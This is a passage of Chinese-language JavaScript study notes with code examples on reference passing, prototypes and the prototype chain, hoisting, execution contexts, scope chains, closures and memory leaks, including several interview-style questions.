console.log(obj1.name) function f1(obj) &#123; obj.age = 12 &#125; f1(obj2) console.log(obj1.age) //2. 2个引用变量指向同一个对象,让一个引用变量指向另一个对象, 另一个引用变量还是指向原来的对象 var obj3 = &#123; name: &#x27;Tom&#x27; &#125; var obj4 = obj3 obj3 = &#123; name: &#x27;JACK&#x27; &#125; console.log(obj4.name) function f2(obj) &#123; obj = &#123; name: &#x27;Bob&#x27; &#125; &#125; f2(obj4) console.log(obj4.name) console.log(&quot;----------------&quot;) var a = &#123; name: &#x27;zjl&#x27; &#125; var b = &#123; name: &#x27;zjl&#x27; &#125; a.name = &#x27;ycy&#x27; console.log(b.name); /* 因为a和b指向的不是同一个对象 */ &lt;/script&gt;&lt;/body&gt; 易错点123456789a = &#123; name: &#x27;zjl&#x27; &#125;function fun1(obj) &#123; obj = &#123; name: &quot;羽川翼&quot; &#125; console.log(a.name) //zjl console.log(obj.name) //羽川翼&#125;fun1(a)console.log(a) // &#123; name: &#x27;zjl&#x27; &#125; /* 总结：obj引用的地址值发生改变，不再引用传进来的形参地址，并且函数作用域的原因，这个对象只能在函数内使用 */ 调用函数时，将数据a赋值给形参obj，此时a和obj都指向堆中的同一个&#123; name: &#39;zjl&#39; &#125;，在函数内部修改obj指向的对象，由：2个引用变量指向同一个对象,让一个引用变量指向另一个对象, 另一个引用变量还是指向原来的对象，所以a仍然指向&#123; name: &#39;zjl&#39; &#125;，而obj指向&#123; name: &quot;羽川翼&quot; &#125;，obj只是具有局部作用域，而且函数执行完成后会被销毁。 12345678910111213141516// 同理有：a = 3function fun1(v) &#123; v = 666 console.log(a) // 3&#125;fun1(a)console.log(a) // 3function fun2(a) &#123; a = 666 console.log(a) // 666&#125;fun2(a)console.log(a) // 3 06 相关问题2123456789101112131415161718192021&lt;body&gt; &lt;!--问题: 在js调用函数时传递变量参数时, 是值传递还是引用传递 * 只有值传递, 没有引用传递, 传递的都是变量的值, 只是这个值可能是基本数据, 也可能是地址(引用)数据 * 如果后一种看成是引用传递, 那就值传递和引用传递都可以有--&gt; &lt;script type=&quot;text/javascript&quot;&gt; function f(a) &#123; console.log(a) &#125; var n = 4 f(n) //传递的是n的值 ---&gt;值传递 function f2(a) &#123; a.name = &#x27;atguigu&#x27; &#125; n = &#123;&#125; f2(n) // 传递的是n指向的对象 ---&gt; 引用传递 console.log(n.name) &lt;/script&gt;&lt;/body&gt; 内存管理12345678910111213141516171819202122&lt;body&gt;&lt;!--问题: JS引擎如何管理内存? 1. 内存生命周期 1). 分配需要的内存 2). 使用分配到的内存 3). 不需要时将其释放/归还 2. 释放内存 * 为执行函数分配的栈空间内存；函数执行完自动释放 * 存储对象的堆空间内存: 当内存没有引用指向时, 对象成为垃圾对象, 垃圾回收器后面就会回收释放此内存--&gt;&lt;script type=&quot;text/javascript&quot;&gt; var obj = &#123;&#125; obj = null // ? function fn () &#123; var a = 3 var b = &#123;&#125; &#125; fn() // a,b都是自动释放的，在后面某个时刻由垃圾回收器回收&lt;/script&gt;&lt;/body&gt; 07 对象1234567891011121314151617181920212223242526272829303132333435363738394041&lt;body&gt;&lt;!--1. 什么是对象? * 代表现实中的某个事物, 是该事物在编程中的抽象 * 多个数据的集合体(封装体) * 用于保存多个数据的容器2. 为什么要用对象? * 便于对多个数据进行统一管理3. 对象的组成 * 属性 * 代表现实事物的状态数据 * 由属性名和属性值组成 * 属性名都是字符串类型, 属性值是任意类型 * 方法 * 代表现实事物的行为数据 * 是特别的属性==&gt;属性值是函数4. 如何访问对象内部数据? * .属性名: 编码简单, 但有时不能用 * [&#x27;属性名&#x27;]: 编码麻烦, 但通用--&gt;&lt;script type=&quot;text/javascript&quot;&gt; // 创建对象 var p = &#123; name: &#x27;Tom&#x27;, age: 12, setName: function (name) &#123; this.name = name &#125;, setAge: function (age) &#123; this.age = age &#125; &#125; // 访问对象内部数据 console.log(p.name, p[&#x27;age&#x27;]) p.setName(&#x27;Jack&#x27;) p[&#x27;age&#x27;](23) console.log(p[&#x27;name&#x27;], p.age)&lt;/script&gt;&lt;/body&gt; 属性名相关问题1234567891011121314151617181920212223&lt;body&gt; &lt;!--问题: 什么时候必须使用[&#x27;属性名&#x27;]的方式? * 属性名不是合法的标识名 * 属性名不确定--&gt; &lt;script type=&quot;text/javascript&quot;&gt; // 创建对象 var p = &#123;&#125; /*情形一: 属性名不是合法的标识名*/ /*需求: 添加一个属性: content-type: text/json */ // p.content-type = &#x27;text/json&#x27; //不正确 p[&#x27;content-type&#x27;] = &#x27;text/json&#x27; /*情形二: 需要使用变量作为对象的属性名时*/ var prop = &#x27;xxx&#x27; var value = 123 // p.prop = value //不正确 p[prop] = value console.log(p[&#x27;content-type&#x27;], p[prop]) &lt;/script&gt;&lt;/body&gt; 08 函数123456789101112131415161718192021222324252627282930313233343536&lt;body&gt; &lt;!--1. 什么是函数? * 具有特定功能的n条语句的封装体 * 只有函数是可执行的, 其它类型的数据是不可执行的 * 函数也是对象 * typeof检查返回function2. 为什么要用函数? * 提高代码复用 * 便于阅读和交流3. 如何定义函数? * 函数声明 * 表达式4. 如何调用(执行)函数? * test() * new test()：构造函数 * obj.test()：通过对象调用 * test.call/apply(obj)：临时让test成为obj的方法进行调用（本来obj中没有test方法，目的是改变this的指向为obj）--&gt; &lt;script type=&quot;text/javascript&quot;&gt; /* 函数也是对象 */ function fn() &#123; &#125; console.log(fn instanceof Object) // 是Object类型的实例 console.log(fn.prototype) // 内部有属性 console.log(fn.call) // 内部有方法 fn.t1 = &#x27;atguigu&#x27; // 可以添加属性 fn.t2 = function () &#123; // 可以添加方法 console.log(&#x27;t2() &#x27; + this.t1) &#125; fn.t2() &lt;/script&gt;&lt;/body&gt; 09 回调函数12345678910111213141516171819202122232425262728&lt;body&gt; &lt;button id=&quot;btn&quot;&gt;测试点击事件&lt;/button&gt; &lt;!--1. 什么函数才是回调函数? * 你定义的 * 你没有直接调用 * 但最终它执行了(在特定条件或时刻)2. 常见的回调函数? * DOM事件函数 * 定时器函数 * ajax回调函数(后面学) * 生命周期回调函数(后面学)--&gt; &lt;script type=&quot;text/javascript&quot;&gt; //1. DOM事件回调函数 var btn = document.getElementById(&#x27;btn&#x27;) btn.onclick = function () &#123; alert(this.innerHTML) &#125; //2. 定时器回调函数 setInterval(function () &#123; alert(&#x27;到点啦!&#x27;) &#125;, 2000) &lt;/script&gt;&lt;/body&gt; 10 IIFE(立即调用函数表达式 / 匿名函数自调用)1234567891011121314151617&lt;!--1. 理解 * 全称: Immediately-Invoked Function Expression 立即调用函数表达式 * 别名: 匿名函数自调用2. 作用 * 隐藏内部实现 * 不污染外部命名空间--&gt;&lt;script type=&quot;text/javascript&quot;&gt; (function (i) &#123; var a = 4 function fn() &#123; console.log(&#x27;fn &#x27;, i+a) &#125; fn() &#125;)(3)&lt;/script&gt; 1234567891011121314151617181920212223242526272829303132333435&lt;body&gt; &lt;!--1. 理解 * 全称: Immediately-Invoked Function Expression 立即调用函数表达式 * 别名: 匿名函数自调用2. 作用 * 隐藏内部实现 * 不污染外部命名空间 * 用来编写js模块--&gt; &lt;script type=&quot;text/javascript&quot;&gt; (function (i) &#123; var a = 4 function fn() &#123; console.log(&#x27;fn &#x27;, i + a) &#125; fn() &#125;)(3) var a = 4 console.log(a) // 4 // 对于匿名函数调用，千万小心分号！！！ ; (function () &#123; var a = 1 function test() &#123; console.log(++a) &#125; window.$ = function () &#123; // 向外暴露一个全局函数 return &#123; test: test &#125; &#125; &#125;)() $().test() // 2 console.log(a) // 4 11 函数中的this12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;body&gt; &lt;!--1. this是什么? * 任何函数本质上都是通过某个对象来调用的，如果没有直接指定，那就是window * 一个关键字, 一个内置的引用变量 * 在函数中都可以直接使用this * this代表调用函数的当前对象 * 在定义函数时, this还没有确定, 只有在执行时才动态确定(绑定)的2. 如何确定this的值? * test():window * obj.test():obj * new test():新创建的对象 * test.call(obj):obj前置知识: * 本质上任何函数在执行时都是通过某个对象调用的--&gt; &lt;script type=&quot;text/javascript&quot;&gt; function Person(color) &#123; console.log(this) this.color = color; this.getColor = function () &#123; console.log(this) return this.color; &#125;; this.setColor = function (color) &#123; console.log(this) this.color = color; &#125;; &#125; Person(&quot;red&quot;); //this是谁? window var p = new Person(&quot;yello&quot;); //this是谁? p p.getColor(); //this是谁? p var obj = &#123;&#125;; p.setColor.call(obj, &quot;black&quot;); //this是谁? obj var test = p.setColor; test(); //this是谁? window function fun1() &#123; function fun2() &#123; console.log(this); &#125; fun2(); //this是谁? window &#125; fun1(); &lt;/script&gt;&lt;/body&gt; 12 分号问题1234567891011121314151617181920212223242526272829303132333435&lt;!--1. js一条语句的后面可以不加分号2. 是否加分号是编码风格问题, 没有应该不应该，只有你自己喜欢不喜欢3. 在下面2种情况下不加分号会有问题 * 小括号开头的前一条语句 * 中方括号开头的前一条语句4. 解决办法: 在行首加分号5. 强有力的例子: vue.js库6. 知乎热议: https://www.zhihu.com/question/20298345--&gt;&lt;script type=&quot;text/javascript&quot;&gt; // 情形一: 小括号开头的前一条语句 var a = 3 ; (function () &#123; &#125;) /* 错误理解: 将3看成是函数调用 var a = 3(function () &#123; &#125;) */ // 情形二: 中方括号开头的前一条语句 var b = a ;[1, 3, 5].forEach(function (item) &#123; console.log(item) &#125;) /* 错误理解: a = b[5].forEach(function(e)&#123; console.log(e) &#125;)&lt;/script&gt; 函数高级15 函数的prototype 123456789101112131415161718192021222324252627282930313233343536&lt;body&gt; &lt;!--1. 函数的prototype属性(图) * 每个函数都有一个prototype属性, 它默认指向一个Object空对象(即称为: 原型对象) * 原型对象中有一个属性constructor, 它指向函数对象2. 给原型对象添加属性(一般都是方法) * 作用: 函数的所有实例对象自动拥有原型中的属性(方法)--&gt; &lt;script type=&quot;text/javascript&quot;&gt; // 每个函数都有一个prototype属性, 它默认指向一个对象(即称为: 原型对象) console.log(Date.prototype, typeof Date.prototype) function fn() &#123; &#125; console.log(fn.prototype, typeof fn.prototype) // 原型对象中有一个属性constructor, 它指向函数对象 console.log(Date.prototype.constructor === Date) console.log(fn.prototype.constructor === fn) // 2. 给原型对象添加属性(一般都是方法)===&gt;实例对象可以访问 function F() &#123; &#125; F.prototype.age = 12 //添加属性 F.prototype.setAge = function (age) &#123; // 添加方法 this.age = age &#125; // 创建函数的实例对象 var f = new F() console.log(f.age) f.setAge(23) console.log(f.age) &lt;/script&gt;&lt;/body&gt; 16 显式原型和隐式原型123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;02_显式原型与隐式原型&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--1. 每个函数function都有一个prototype，即显式原型2. 每个实例对象都有一个__proto__，可称为隐式原型3. 对象的隐式原型的值为其对应构造函数的显式原型的值4. 内存结构(图)5. 总结: * 函数的prototype属性: 在定义函数时自动添加的, 默认值是一个空Object对象 * 对象的__proto__属性: 创建对象时自动添加的, 默认值为构造函数的prototype属性值 * 程序员能直接操作显式原型, 但不能直接操作隐式原型(ES6之前)--&gt; &lt;script type=&quot;text/javascript&quot;&gt; function Fn() &#123; &#125; var fn = new Fn() console.log(Fn.prototype, fn.__proto__) // console.log(Fn.prototype===fn.__proto__) // Fn.prototype.test = function () &#123; // console.log(&#x27;test()&#x27;) // &#125; // fn.test() &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 17 原型链12345678910111213141516171819202122232425262728293031&lt;body&gt; &lt;!--1. 原型链(图解) * 访问一个对象的属性时， * 先在自身属性中查找，找到返回 * 如果没有, 再沿着__proto__这条链向上查找, 找到返回 * 如果最终没找到, 返回undefined * 别名: 隐式原型链 * 作用: 查找对象的属性(方法)2. 构造函数/原型/实体对象的关系(图解)3. 构造函数/原型/实体对象的关系2(图解)--&gt; &lt;script type=&quot;text/javascript&quot;&gt; function Fn() &#123; this.test1 = function () &#123; console.log(&#x27;test1()&#x27;) &#125; &#125; console.log(Fn.prototype) // 含有test2() Fn.prototype.test2 = function () &#123; console.log(&#x27;test2()&#x27;) &#125; var fn = new Fn() fn.test1() fn.test2() console.log(fn.toString()) console.log(fn.test3) // undefined fn.test3() // 报错 &lt;/script&gt;&lt;/body&gt; var Foo = new Function()，所以所有函数都有隐式原型属性，指向Function的显示原型。 注意： function Function()实例对象的显示原型和隐式原都型指向Function.prototype 所有函数的隐式原型__proto__都应该相等，因为都是new Function()产生的，所以都指向Function.prototype 实例对象的隐式原型等于构造函数的显式原型，所以Object()的__proto等于function Function()的显式原型属性。 javascript——原型与原型链 - 雅昕 - 博客园 (cnblogs.com) 自己尝试用process on画了一下，不知道对不对，反正都可以在控制台验证的。 https://www.processon.com/view/link/619c9b56e401fd183dbdee8f 18 原型链补充函数的显式原型指向的对象默认是空Object对象（但是Object不满足） 12345678910111213141516171819202122232425&lt;body&gt; &lt;script&gt; function Fn() &#123; this.test1 = function () &#123; console.log(&#x27;test1()&#x27;) &#125; &#125; /* 1.函数的显式原型指向的对象默认是空Object实例对象（但是Object不满足） */ console.log(Fn.prototype instanceof Object) // true console.log(Object.prototype instanceof Object) // false console.log(Function.prototype instanceof Object) // true /* 2.所有函数都是Function的实例对象（包含Function本身） */ console.log(Function.__proto__ === Function.prototype) // true /* 2.Object的原型对象是原型链的尽头 */ console.log(Object.prototype.__proto__) // null &lt;/script&gt;&lt;/body&gt; 19 原型链属性问题12345678910111213141516171819&lt;body&gt; &lt;!-- 1. 读取对象的属性值时: 会自动到原型链中查找 2. 设置对象的属性值时: 不会查找原型链, 如果当前对象中没有此属性, 直接添加此属性并设置其值 3. 方法一般定义在原型中, 属性一般通过构造函数定义在对象本身上--&gt; &lt;script&gt; function Fn() &#123; &#125; Fn.prototype.a = &#x27;xxx&#x27; var fn1 = new Fn() console.log(fn1.a, fn1) // xxx Fn&#123;&#125; var fn2 = new Fn() fn2.a = &#x27;yyy&#x27; console.log(fn1.a, fn2.a, fn2) // xxx yyy Fn &#123;a: &#x27;yyy&#x27;&#125; &lt;/script&gt;&lt;/body&gt; 123456789101112131415161718192021222324252627&lt;body&gt; &lt;!--1. 读取对象的属性值时: 会自动到原型链中查找2. 设置对象的属性值时: 不会查找原型链, 如果当前对象中没有此属性, 直接添加此属性并设置其值3. 方法一般定义在原型中, 属性一般通过构造函数定义在对象本身上--&gt; &lt;script type=&quot;text/javascript&quot;&gt; function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.setName = function (name) &#123; this.name = name; &#125; Person.prototype.sex = &#x27;男&#x27;; var p1 = new Person(&#x27;Tom&#x27;, 12) p1.setName(&#x27;Jack&#x27;) console.log(p1.name, p1.age, p1.sex) p1.sex = &#x27;女&#x27; console.log(p1.name, p1.age, p1.sex) var p2 = new Person(&#x27;Bob&#x27;, 23) console.log(p2.name, p2.age, p2.sex) &lt;/script&gt;&lt;/body&gt; 20 探索instanceof instanceof是如何判断的? 表达式: A instanceof B 如果B函数的显式原型对象在A对象的原型链上, 返回true, 否则返回false Function是通过new自己产生的实例 案例一1234function Foo() &#123; &#125;var f1 = new Foo();console.log(f1 instanceof Foo); // tureconsole.log(f1 instanceof Object); //true 案列二1234567console.log(Object instanceof Function); // trueconsole.log(Object instanceof Object); // trueconsole.log(Function instanceof Function); // trueconsole.log(Function instanceof Object); // truefunction Foo() &#123;&#125;console.log(Object instanceof Foo); // false 22 变量提升与函数提升12345678910 &lt;!--1. 变量声明提升(必须使用函数声明方式，不能使用变量声明方式) * 通过var定义(声明)的变量, 在定义语句之前就可以访问到 * 值: undefined2. 函数声明提升 * 通过function声明的函数, 在之前就可以直接调用 * 值: 函数定义(对象)3. 问题: 变量提升和函数提升是如何产生的?--&gt; 123/*变量提升*/console.log(a1) //可以访问, 但值是undefinedvar a1 = 3 1234567/*函数提升*/a2() // 可以直接调用var a1 = 3function a2() &#123; console.log(&#x27;a2()&#x27;)&#125; 易错12345f3() // 不能调用，会报错，因为此时遵循变量提升var f3 = function()&#123; console.log(&#x27;f3()&#x27;)&#125; 23 执行上下文 代码分类(位置) 全局代码 函数代码 全局执行上下文 在执行全局代码前将window确定为全局执行上下文 对全局数据进行预处理 var定义的全局变量（直接a = 1是不行的，不会被预处理）==&gt;undefined, 添加为window的属性 function声明的全局函数==&gt;赋值(fun), 添加为window的方法 this==&gt;赋值(window) 开始执行全局代码 函数执行上下文 在调用函数, 准备执行函数体之前, 创建对应的函数执行上下文对象 对局部数据进行预处理 形参变量==&gt;赋值(实参)==&gt;添加为执行上下文的属性 arguments==&gt;赋值(实参列表), 添加为执行上下文的属性 var定义的局部变量==&gt;undefined, 添加为执行上下文的属性 function声明的函数 ==&gt;赋值(fun), 添加为执行上下文的方法 this==&gt;赋值(调用函数的对象) 开始执行函数体代码 12345678910111213141516&lt;script type=&quot;text/javascript&quot;&gt; var a1 = 1 function fn() &#123; console.log(a1) // 1 console.log(a2) // undefined a3() // a3()!! console.log(this) // Window console.log(arguments) // 输出伪数组对象 var a2 = 3 function a3() &#123; console.log(&#x27;a3()!!&#x27;) &#125; &#125; fn(2, 3)&lt;/script&gt; 24 执行上下文栈 12345678910111213141516171819202122&lt;body&gt;&lt;!--1. 在全局代码执行前, JS引擎就会创建一个栈来存储管理所有的执行上下文对象2. 在全局执行上下文(window)确定后, 将其添加到栈中(压栈)3. 在函数执行上下文创建后, 将其添加到栈中(压栈)4. 在当前函数执行完后,将栈顶的对象移除(出栈)5. 当所有的代码执行完后, 栈中只剩下window--&gt;&lt;script type=&quot;text/javascript&quot;&gt; //1. 进入全局执行上下文 var a = 10 var bar = function (x) &#123; var b = 5 foo(x + b) //3. 进入foo执行上下文 &#125; var foo = function (y) &#123; var c = 5 console.log(a + c + y) &#125; bar(10) //2. 进入bar函数执行上下文&lt;/script&gt;&lt;/body&gt; 25 上下文面试题第一题 1234567891011121314151617181920212223242526272829303132&lt;body&gt;&lt;!--1. 依次输出什么?2. 整个过程中产生了几个执行上下文? * 全局上下文 * f(1) * f(2) * f(3) * f(4)栈结构分析： f(4) f(3) f(2) f(1) 全局上下文--&gt;&lt;script type=&quot;text/javascript&quot;&gt; console.log(&#x27;global begin: &#x27;+ i) var i = 1 foo(1); function foo(i) &#123; if (i == 4) &#123; return; &#125; console.log(&#x27;foo() begin:&#x27; + i); foo(i + 1) // 递归 console.log(&#x27;foo() end:&#x27; + i); &#125; console.log(&#x27;global end: &#x27; + i)&lt;/script&gt;&lt;/body&gt; 第二题123456789101112131415161718192021222324252627282930&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt; /* 测试题1: 函数提升优先级高于变量提升，且不会被同名变量声明时覆盖，但是会被变量赋值后覆盖 */ function a() &#123;&#125; var a; console.log(typeof a) // function /* 测试题2: 变量预处理, in操作符 */ if (!(b in window)) &#123; var b = 1; // 相当于全局声明了变量b，但是在if中赋值 &#125; console.log(b) // undefined /* 测试题3: 函数提升优先级高于变量提升，且不会被同名变量声明时覆盖，但是会被变量赋值后覆盖，这里是函数被赋值操作覆盖了 */ var c = 1 function c(c) &#123; console.log(c) var c = 3 &#125; c(2) // 报错&lt;/script&gt;&lt;/body&gt; 026 复习JS是基于原型对象的继承，JAVA和Python是基于类的继承。 027 作用域与作用域链 区别1 全局作用域之外，每个函数都会创建自己的作用域，作用域在函数定义时就已经确定，而不是在函数调用时 全局执行上下文环境是在全局作用域确定之后, js代码马上执行之前创建 函数执行上下文环境是在调用函数时, 函数体代码执行之前创建 区别2 作用域是静态的, 只要函数定义好了就一直存在, 且不会再变化 上下文环境是动态的, 调用函数时创建, 函数调用结束时上下文环境就会被释放 联系 执行上下文环境(对象)是从属于所在的作用域 全局上下文环境==&gt;全局作用域 函数上下文环境==&gt;对应的函数使用域 12345678910111213141516171819202122232425262728&lt;body&gt; &lt;!--1. 理解 * 多个上下级关系的作用域形成的链, 它的方向是从下向上的(从内到外) * 查找变量时就是沿着作用域链来查找的2. 查找一个变量的查找规则 * 在当前作用域下的执行上下文中查找对应的属性, 如果有直接返回, 否则进入2 * 在上一级作用域的执行上下文中查找对应的属性, 如果有直接返回, 否则进入3 * 再次执行2的相同操作, 直到全局作用域, 如果还找不到就抛出找不到的异常--&gt; &lt;script type=&quot;text/javascript&quot;&gt; var a = 2; function fn1() &#123; var b = 3; function fn2() &#123; var c = 4; console.log(c); // 3 console.log(b); // 2 console.log(a); // 1 console.log(d); // 报错 &#125; fn2(); &#125; fn1(); &lt;/script&gt;&lt;/body&gt; 注意：函数作用域内读取不到指定变量会抛异常！！！ 28 面试题第一题12345678910111213141516&lt;script type=&quot;text/javascript&quot;&gt; /* 问题: 结果输出多少? 作用域在函数定义时就已经确定 */ var x = 10; function fn() &#123; console.log(x); &#125; function show(f) &#123; var x = 20; f(); &#125; show(fn) // 10&lt;/script&gt; 第二题12345678910111213141516171819202122232425&lt;script type=&quot;text/javascript&quot;&gt; /* 说说它们的输出情况 1.ƒ () &#123; console.log(fn) &#125; 2.Uncaught ReferenceError: fn2 is not defined at Object.fn2 应该改为：this.fn2 */ var fn = function () &#123; console.log(fn) &#125; fn() var obj = &#123; fn2: function () &#123; console.log(fn2) // fn2不是声明的变量，而是obj的属性 &#125; &#125; obj.fn2()&lt;/script&gt; 29 循环遍历加监听错误代码 12345678910111213141516171819&lt;body&gt; &lt;button&gt;测试1&lt;/button&gt; &lt;button&gt;测试2&lt;/button&gt; &lt;button&gt;测试3&lt;/button&gt; &lt;!--需求: 点击某个按钮, 提示&quot;点击的是第n个按钮&quot;--&gt; &lt;script type=&quot;text/javascript&quot;&gt; var btns = document.getElementsByTagName(&#x27;button&#x27;) //有问题 for(var i=0,length=btns.length;i&lt;length;i++) &#123; var btn = btns[i] btn.onclick = function () &#123; alert(&#x27;第&#x27;+(i+1)+&#x27;个&#x27;) &#125; &#125; &lt;/script&gt;&lt;/body&gt; 将i保存为下标 12345678910111213141516&lt;body&gt; &lt;button&gt;测试1&lt;/button&gt; &lt;button&gt;测试2&lt;/button&gt; &lt;button&gt;测试3&lt;/button&gt; &lt;!-- 需求：点击某个按钮，提示点击的是第几个按钮 --&gt; &lt;script&gt; var btns = document.getElementsByTagName(&quot;button&quot;) for (var i = 0; i &lt; btns.length; i++) &#123; btns[i].index = i + 1 // 将btn对应的下标保存为每个btn的属性 btns[i].onclick = function () &#123; alert(&#x27;这是第&#x27; + this.index + &#x27;个button&#x27;) &#125; &#125; &lt;/script&gt;&lt;/body&gt; 利用闭包 123456789101112131415161718192021&lt;body&gt; &lt;button&gt;测试1&lt;/button&gt; &lt;button&gt;测试2&lt;/button&gt; &lt;button&gt;测试3&lt;/button&gt; &lt;!--需求: 点击某个按钮, 提示&quot;点击的是第n个按钮&quot;--&gt; &lt;script type=&quot;text/javascript&quot;&gt; var btns = document.getElementsByTagName(&#x27;button&#x27;) //解决办法: 利用闭包 for (var i = 0, length = btns.length; i &lt; length; i++) &#123; (function (i) &#123; var btn = btns[i] btn.onclick = function () &#123; alert(&#x27;第&#x27; + (i + 1) + &#x27;个&#x27;) &#125; &#125;)(i) &#125; &lt;/script&gt;&lt;/body&gt; 30 理解闭包12345678910111213141516171819202122232425&lt;body&gt; &lt;!--1. 如何产生闭包? * 当一个嵌套的内部(子)函数引用了嵌套的外部(父)函数的变量(函数)时, 就产生了闭包2. 闭包到底是什么? * 使用chrome调试查看 * 理解一: 闭包是嵌套的内部函数(绝大部分人) * 理解二: 包含被引用变量(函数)的对象(极少数人) * 注意: 闭包存在于嵌套的内部函数中3. 产生闭包的条件? * 函数嵌套 * 内部函数引用了外部函数的数据(变量/函数)--&gt; &lt;script type=&quot;text/javascript&quot;&gt; function fn1() &#123; var a = 3 function fn2() &#123; // 执行函数定义就会产生闭包（不用调用内部函数） console.log(a) &#125; return fn2 &#125; fn1() &lt;/script&gt;&lt;/body&gt; 31 常见的闭包1234567891011121314151617181920212223242526272829303132&lt;body&gt; &lt;!--1. 将函数作为另一个函数的返回值2. 将函数作为实参传递给另一个函数调用--&gt; &lt;script type=&quot;text/javascript&quot;&gt; // 1. 将函数作为另一个函数的返回值 function fn1() &#123; var a = 2 function fn2() &#123; a++ console.log(a) &#125; return fn2 &#125; var f = fn1() // 注意：fn1()函数执行后，局部变量fn2被释放了，但是fn2所保存的函数对象的地址值返回给了全局变量f了 f() // 3 f() // 4 // 2. 将函数作为实参传递给另一个函数调用 function showMsgDelay(msg, time) &#123; setTimeout(function () &#123; console.log(msg) &#125;, time) &#125; showMsgDelay(&#x27;hello&#x27;, 1000) &lt;/script&gt;&lt;/body&gt; 32 闭包的作用1234567891011121314151617181920212223242526272829&lt;body&gt; &lt;!--1. 使用函数内部的变量在函数执行完后, 仍然存活在内存中(延长了局部变量的生命周期)2. 让函数外部可以操作(读写)到函数内部的数据(变量/函数)问题: 1. 函数执行完后, 函数内部声明的局部变量是否还存在? 一般是不会存在的，存在于闭包中的变量才可能存在 2. 在函数外部能直接访问函数内部的局部变量吗? 不能，但是通过闭包可以让外部操作它 --&gt; &lt;script type=&quot;text/javascript&quot;&gt; function fun1() &#123; var a = 3; function fun2() &#123; a++; //引用外部函数的变量---&gt;产生闭包 console.log(a); &#125; return fun2; &#125; var f = fun1(); //由于f引用着内部的函数--&gt;内部函数以及闭包都没有成为垃圾对象（如果只是fun1()，那么局部变量就不会存在） /* fun1()执行完由于是函数释放成为垃圾对象，当f=fn1时由于是赋值操作把地址赋值给了所以现在是f和fn1都指向一个内存空间，所以fun1执行完不能释放因为f还指向这个内存空间 */ f(); //间接操作了函数内部的局部变量 f(); &lt;/script&gt;&lt;/body&gt; 33 闭包的生命周期123456789101112131415161718192021222324&lt;body&gt;&lt;!--1. 产生: 在嵌套内部函数定义执行完时就产生了(不是在调用)2. 死亡: 在嵌套的内部函数成为垃圾对象时--&gt;&lt;script type=&quot;text/javascript&quot;&gt; function fun1() &#123; //此处闭包已经产生 var a = 3; function fun2() &#123; a++; console.log(a); &#125; return fun2; &#125; var f = fun1(); f(); f(); f = null //此时闭包对象死亡（包含闭包的函数成为了垃圾对象）&lt;/script&gt;&lt;/body&gt; 34 闭包应用 自定义JS模块例一12345678910111213141516171819202122/** * 自定义模块1 */function coolModule() &#123; //私有的数据 var msg = &#x27;atguigu&#x27; var names = [&#x27;I&#x27;, &#x27;Love&#x27;, &#x27;you&#x27;] //私有的操作数据的函数 function doSomething() &#123; console.log(msg.toUpperCase()) &#125; function doOtherthing() &#123; console.log(names.join(&#x27; &#x27;)) &#125; //向外暴露包含多个方法的对象 return &#123; doSomething: doSomething, doOtherthing: doOtherthing &#125; &#125; 123456789101112131415&lt;body&gt;&lt;!--闭包的应用2 : 定义JS模块 * 具有特定功能的js文件 * 将所有的数据和功能都封装在一个函数内部(私有的) * 只向外暴露一个包信n个方法的对象或函数 * 模块的使用者, 只需要通过模块暴露的对象调用方法来实现对应的功能--&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;05_coolModule.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; var module = coolModule() module.doSomething() module.doOtherthing()&lt;/script&gt;&lt;/body&gt; 例二1234567891011121314151617181920/** * 自定义模块2 */(function (window) &#123; //私有的数据 var msg = &#x27;atguigu&#x27; var names = [&#x27;I&#x27;, &#x27;Love&#x27;, &#x27;you&#x27;] //操作数据的函数 function a() &#123; console.log(msg.toUpperCase()) &#125; function b() &#123; console.log(names.join(&#x27; &#x27;)) &#125; window.coolModule2 = &#123; doSomething: a, doOtherthing: b &#125;&#125;)(window) 1234567891011121314&lt;body&gt;&lt;!--闭包的应用2 : 定义JS模块 * 具有特定功能的js文件 * 将所有的数据和功能都封装在一个函数内部(私有的) * 只向外暴露一个包信n个方法的对象或函数 * 模块的使用者, 只需要通过模块暴露的对象调用方法来实现对应的功能--&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;05_coolModule2.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; coolModule2.doSomething() coolModule2.doOtherthing()&lt;/script&gt;&lt;/body&gt; 35 闭包缺点——内存溢出和内存泄漏12345678910111213141516171819202122232425262728&lt;body&gt;&lt;!--1. 缺点 * 函数执行完后, 函数内的局部变量没有释放, 占用内存时间会变长 * 容易造成内存泄露2. 解决 * 能不用闭包就不用 * 及时释放--&gt;&lt;script type=&quot;text/javascript&quot;&gt; function fn1() &#123; var a = 2; function fn2() &#123; a++; console.log(a); &#125; return fn2; &#125; var f = fn1(); f(); // 3 f(); // 4 f = null // 释放&lt;/script&gt;&lt;/body&gt; 内存溢出 一种程序运行出现的错误 当程序运行需要的内存超过了剩余的内存时，就抛出内存溢出的错误 内存泄漏 占用的内存没有及时释放 内存泄漏积累多了容易导致内存溢出 常见内存泄漏 意外的全局变量 没有及时清理的计时器或回调函数 闭包 12345678910111213141516171819202122232425262728293031323334&lt;body&gt; &lt;script&gt; // 内存溢出 var obj = &#123;&#125;; for (var i = 0; i &lt; 10000; i++) &#123; obj[i] = new Array(100000000); console.log(&quot;--------------&quot;); &#125; // 内存泄漏 function fn() &#123; a = 3 // 不使用var会导致a变成全局变量 console.log(a) &#125; fn() var id = setInterval(function () &#123; // 启动循环定时器后不清理 console.log(&#x27;------------&#x27;) &#125;, 10000) // clearInterval(id) function fn1() &#123; var a = 1 function fn2() &#123; a++ console.log(a) &#125; return fn2 &#125; var f = fn1() // f = null // 需要释放 &lt;/script&gt;&lt;/body&gt; 36 面试题12345678910111213141516171819202122232425262728293031&lt;script type=&quot;text/javascript&quot;&gt; /* 说说它们的输出情况 */ //代码片段一 var name = &quot;The Window&quot;; var object = &#123; name: &quot;My Object&quot;, getNameFunc: function () &#123; return function () &#123; // console.log(this) // window（没有闭包） return this.name; &#125;; &#125; 